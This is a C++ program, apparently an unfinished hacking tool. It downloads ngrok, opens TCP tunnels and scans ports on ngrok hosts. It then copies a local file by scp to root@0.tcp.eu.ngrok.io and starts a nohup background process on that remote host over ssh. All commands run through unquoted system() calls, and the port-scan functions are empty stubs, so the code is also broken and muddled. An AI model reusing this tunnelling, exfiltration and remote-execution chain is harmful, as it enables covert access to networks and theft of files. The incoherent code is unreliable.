#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <vector>
#include <unistd.h> 


bool isPortOpen(const std::string& host, int port) {

}

int findOpenPort(const std::string& host, int startPort, int endPort) {

}

std::vector<int> scanOpenPorts(const std::string& host, int startPort, int endPort) {

}


std::string getCurrentDirectory() {
    char buffer[FILENAME_MAX];
    if (getcwd(buffer, sizeof(buffer)) != nullptr) {
        return std::string(buffer);
    }
    return "";
}

void runCommand(const std::string& command) {
    std::string osName = "";
    
    #ifdef _WIN32
        osName = "Windows";
    #elif __linux__
        osName = "Linux";
    #elif __APPLE__
        osName = "Mac";
    #endif

    std::string osSpecificCommand = "";

    if (osName == "Windows") {
        osSpecificCommand = "cmd /c " + command; // Example command for Windows
    } else if (osName == "Linux") {
        osSpecificCommand = "bash -c \"" + command + "\""; // Example command for Linux
    } else if (osName == "Mac") {
        osSpecificCommand = "bash -c \"" + command + "\""; // Example command for Mac
    }

    if (!osSpecificCommand.empty()) {
        std::system(osSpecificCommand.c_str());
    } else {
        std::cout << "Unsupported operating system: " << osName << std::endl;
    }
}

int main() {
    std::string ngrokURL = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tar.gz";
    std::string outputDir = getCurrentDirectory();
    std::string downloadCommand = "curl -o ngrok.tar.gz " + ngrokURL;
    runCommand(downloadCommand);
    std::string extractCommand = "tar -xf ngrok.tar.gz -C " + outputDir;
    runCommand(extractCommand);
    std::string removeCommand = "rm ngrok.tar.gz";
    runCommand(removeCommand);
    std::string ngrokPath = outputDir + "/ngrok";
    std::string host = "192.168.1.1"; 
    
    int startPort = 10;
    int endPort = 9000;
    int ngrokPort = findOpenPort(host, startPort, endPort);
    if (ngrokPort == -1) {
        std::cout << "No open ports found." << std::endl;
        return 0;
    }

    std::string tunnelCommand = ngrokPath + " tcp " + std::to_string(ngrokPort) + " &"; 
    runCommand(tunnelCommand);
    std::string connectCommand = "ssh -f -N -p " + std::to_string(ngrokPort) + " 7.tcp.eu.ngrok.io";
    runCommand(connectCommand);
    std::string scanHost = "2.tcp.ngrok.io"; 
    std::vector<int> openPorts = scanOpenPorts(scanHost, startPort, endPort);
    std::cout << "Open ports on " << scanHost << ":" << std::endl;
    for (int port : openPorts) {
        std::cout << "Port " << port << " is open." << std::endl;
    }
    std::string fileToSend = getCurrentDirectory() + "/myfile.txt"; 
    std::string sendCommand = "scp -P " + std::to_string(ngrokPort) + " " + fileToSend + " root@0.tcp.eu.ngrok.io";
    runCommand(sendCommand);
    std::string backgroundProcessCommand = "ssh -p " + std::to_string(ngrokPort) + " root@0.tcp.eu.ngrok.io 'nohup ./background_process &'"; 
    runCommand(backgroundProcessCommand);
    std::string reconnectCommand = ngrokPath + " tcp " + std::to_string(ngrokPort) + " &"; // Running ngrok in the background
    runCommand(reconnectCommand);

    return 0;
}
